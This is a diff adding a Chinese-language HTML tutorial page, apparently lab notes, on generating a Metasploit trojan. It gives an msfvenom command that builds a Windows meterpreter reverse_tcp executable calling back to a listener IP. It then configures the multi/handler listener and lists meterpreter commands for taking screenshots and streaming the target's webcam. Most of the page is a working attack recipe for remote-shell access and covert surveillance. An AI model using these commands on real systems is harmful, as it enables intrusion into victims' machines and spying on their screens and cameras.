@@ -1,0 +1,86 @@
+<!--    author:steam-404    -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>生成木马文件</title>
+    <link rel="stylesheet" href="../../../../../prism/production/prism.css">
+    <script src="../../../../../prism/production/prism.js"></script>
+    <link rel="stylesheet" href="../../default.css">
+</head>
+<body>
+<div id="head">
+    <a href="#generateTrojanFile">生成木马文件</a> <br>
+    <a href="#enableListening">开启监听</a> <br>
+    <a href="#commonCommand">命令</a> <br>
+</div>
+<div id="content">
+    <div id="generateTrojanFile">
+        <p>生成木马文件</p>
+        <h3>初始化Metasploit-Frame</h3>
+        <img src="images/msfconsole.png" alt="">
+        <h3>looklook ip地址</h3>
+        <img src="images/ip%20address.png" alt="">
+        <h3>使用metasploit-frame生成木马文件</h3>
+        <pre>
+            <code class="language-shell">
+                <script type="text/plain" class="language-markup">
+    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.165.236 lport=5555 -f exe -o msf.exe
+                </script>
+            </code>
+        </pre>
+        <img src="images/windowsVirus.png" alt="">
+    </div>
+    <div id="enableListening">
+        <p>开启监听等待靶机上线</p>
+        <pre>
+            <code class="language-shell">
+                <script type="text/plain" class="language-markup">
+    use exploit/multi/handler
+    #调用模块
+
+    set payload windows/x64/meterpreter/reverse_tcp
+    # 设定载荷
+
+    set lhost 192.168.165.236
+    # 设定ip
+
+    set lport 5555
+    # 设定端口
+
+    exploit
+    # 启动监听,等待靶机上线
+                </script>
+            </code>
+        </pre>
+        <h3>靶机下载木马文件并启动</h3>
+    </div>
+    <div id="commonCommand">
+        <p>命令</p>
+        <pre>
+            <code class="language-shell">
+                <script type="text/plain" class="language-markup">
+    screenshot
+    # 截取靶机当前屏幕,并返回到攻击机
+
+    webcam_list
+    # 列出靶机摄像头
+
+    webcam_stream
+    # 调用靶机摄像头
+                </script>
+            </code>
+        </pre>
+        <h3>命令演示</h3>
+        <h3>截屏(终端会显示图片存放位置)</h3>
+        <img src="images/screenshot.png" alt="">
+        <h3>调用靶机摄像头(默认会在桌面生成两个类型文件html和png,打开就能实时监听靶机摄像头)</h3>
+        <img src="images/webcam_stream.png" alt="">
+        <img src="images/callupCameraHTML.png" alt="">
+        <img src="images/callupCameraPNG.png" alt="">
+    </div>
+</div>
+<div id="end">
+</div>
+</body>
+</html>
